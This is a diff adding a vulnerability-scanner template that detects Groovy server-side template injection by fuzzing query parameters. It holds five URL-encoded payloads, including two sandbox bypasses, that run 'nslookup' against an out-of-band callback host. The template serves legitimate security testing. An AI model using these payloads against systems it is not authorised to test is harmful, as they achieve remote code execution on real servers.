@@ -1,0 +1,46 @@
+id: groovy-oob
+
+info:
+  name: Groovy - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK,ritikchaddha
+  severity: high
+  description: |
+    Apache Groovy is a dynamic language with optional static type checking. It is similar to languages like Python, Ruby, Perl, and Smalltalk. It can be used as a scripting language for the Java platform.
+  reference:
+    - https://docs.groovy-lang.org/
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#groovy---command-execution
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob,groovy
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '%24%7Brce%3D%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22%3Brce.execute%28%29.text%7D'
+        - "%24%7B%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22.exec()%7D"
+        - "%24%7Bnew%20org.codehaus.groovy.runtime.MethodClosure(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22%2C%22execute%22).call()%7D"
+        # Sandbox bypass
+        - "%24%7B%20%40ASTTest(value%3D%7Bassert%20java.lang.Runtime.getRuntime().exec(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22)%7D)%20def%20x%20%7D"
+        - "%24%7B%20new%20groovy.lang.GroovyClassLoader().parseClass(%22%40groovy.transform.ASTTest(value%3D%7Bassert%20java.lang.Runtime.getRuntime().exec(%5C%22nslookup%20-type%3DSRV%20{{interactsh-url}}%5C%22)%7D)def%20x%22)%20%7D"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 490a0046304402205ead8b6ab5843cf8f9dacbf9c9b30903379407d101cf23f135ee3412487d306e0220265dec49712207006d6488a7c29aa571781985047f146485cb74bd889382f80a:922c64590222798bb761d5b6d8e72950
